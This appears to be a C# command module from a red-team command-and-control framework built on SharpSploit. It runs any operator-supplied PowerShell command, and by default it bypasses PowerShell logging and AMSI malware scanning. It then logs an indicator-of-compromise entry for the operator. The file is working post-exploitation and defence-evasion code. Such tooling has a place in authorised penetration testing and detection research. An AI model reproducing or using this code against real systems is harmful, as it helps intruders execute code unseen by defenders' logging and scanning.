using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Faction.Modules.Dotnet.Common;
using SharpSploit.Execution;

namespace Faction.Modules.Dotnet.Commands
{
  class PowerShell : Command
  {
    public override string Name { get { return "powershell"; } }
    public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
    {
      CommandOutput output = new CommandOutput();
      try
      {
        bool bypassLogging = true;
        bool bypassAmsi = true;
        bool outString = true;

        if (Parameters.ContainsKey("BypassLogging"))
        {
          bypassLogging = Boolean.Parse(Parameters["BypassLogging"]);
        }

        if (Parameters.ContainsKey("BypassAmsi"))
        {
          bypassAmsi = Boolean.Parse(Parameters["BypassAmsi"]);
        }

        if (Parameters.ContainsKey("OutString"))
        {
          outString = Boolean.Parse(Parameters["OutString"]);
        }

        string command = Parameters["Command"];
        output.Message = Shell.PowerShellExecute(command, outString, bypassLogging, bypassAmsi);
        output.Complete = true;
        output.Success = true;
        IOC ioc = new IOC("other", "PowerShell", "executed", $"PowerShell command executed: {command}");
        output.IOCs.Add(ioc);
      }
      catch (Exception e)
      {
        output.Complete = true;
        output.Success = false;
        output.Message = e.Message;
      }
      return output;
    }
  }
}

